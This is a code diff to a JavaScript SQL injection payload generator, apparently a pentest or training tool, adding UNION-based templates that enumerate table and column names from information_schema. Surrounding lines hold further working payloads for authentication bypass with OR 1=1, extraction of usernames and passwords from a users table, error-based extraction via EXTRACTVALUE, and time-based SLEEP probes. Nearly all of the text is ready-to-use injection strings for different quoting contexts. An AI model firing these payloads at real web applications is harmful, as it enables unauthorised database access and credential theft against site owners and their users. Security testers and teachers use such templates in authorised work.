@@ -28,6 +28,8 @@ const VulnData = {
     actions: [
       { id: 'auth_bypass', label: 'Authentication Bypass (OR 1=1)' },
       { id: 'union_extract', label: 'UNION Data Extraction' },
+      { id: 'enum_tables', label: 'Enumerate Tables (information_schema)' },
+      { id: 'enum_columns', label: 'Enumerate Columns (information_schema)' },
       { id: 'error_extract', label: 'Error-Based Extraction' },
       { id: 'time_delay', label: 'Time-Based Delay (SLEEP)' }
     ]
@@ -127,6 +129,16 @@ const PayloadTemplates = {
       int: { code: "-1 UNION SELECT username, password FROM users-- -", desc: "Uses -1 to make the first query empty, then appends results." },
       string_dq: { code: "\" UNION SELECT username, password FROM users-- -", desc: "Closes double quotes and uses UNION." },
       string_sq: { code: "' UNION SELECT username, password FROM users-- -", desc: "Closes single quotes and uses UNION." }
+    },
+    enum_tables: {
+      int: { code: "-1 UNION SELECT table_name, null FROM information_schema.tables WHERE table_schema=database()-- -", desc: "Extracts table names from the current database by querying the information_schema metadata table." },
+      string_dq: { code: "\" UNION SELECT table_name, null FROM information_schema.tables WHERE table_schema=database()-- -", desc: "Breaks double quotes and extracts table names from information_schema." },
+      string_sq: { code: "' UNION SELECT table_name, null FROM information_schema.tables WHERE table_schema=database()-- -", desc: "Breaks single quotes and extracts table names from information_schema." }
+    },
+    enum_columns: {
+      int: { code: "-1 UNION SELECT column_name, null FROM information_schema.columns WHERE table_name='[YOUR_TABLE_NAME]'-- -", desc: "Extracts column names for a specific table (replace [YOUR_TABLE_NAME] with the target table) from information_schema." },
+      string_dq: { code: "\" UNION SELECT column_name, null FROM information_schema.columns WHERE table_name='[YOUR_TABLE_NAME]'-- -", desc: "Breaks double quotes and extracts column names for a specific table." },
+      string_sq: { code: "' UNION SELECT column_name, null FROM information_schema.columns WHERE table_name='[YOUR_TABLE_NAME]'-- -", desc: "Breaks single quotes and extracts column names for a specific table." }
     },
     error_extract: {
       int: { code: "1 AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT @@version), 0x7e))", desc: "MySQL Error-based extraction. Forces a syntax error that outputs the result in the error message." },
